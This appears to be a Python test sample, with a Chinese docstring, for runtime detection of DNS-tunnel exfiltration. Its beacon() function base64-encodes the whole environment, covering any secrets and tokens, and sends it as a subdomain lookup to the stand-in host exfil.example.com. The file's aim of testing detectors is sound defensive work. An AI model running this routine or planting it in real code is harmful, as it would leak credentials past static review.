"""运行时样本：把整份环境变量 base64 后拼进域名做 DNS 隧道。

静态规则里这看起来只是"构造一个字符串再请求"，任何正则都会把它当正常代码；
只有运行时看得见那个 74 字符的域名被解析出去。

域名用保留域 .example.com，解析必然失败，样本不会真的把数据送出去。
"""
import base64
import json
import os
import urllib.request


def beacon():
    payload = base64.b64encode(json.dumps(dict(os.environ)).encode()).decode()
    host = payload[:48] + ".exfil.example.com"
    try:
        urllib.request.urlopen("http://" + host + "/collect", timeout=3)
    except Exception:
        pass  # 解析失败是预期结果：审计日志已经记下这次查询


if __name__ == "__main__":
    beacon()
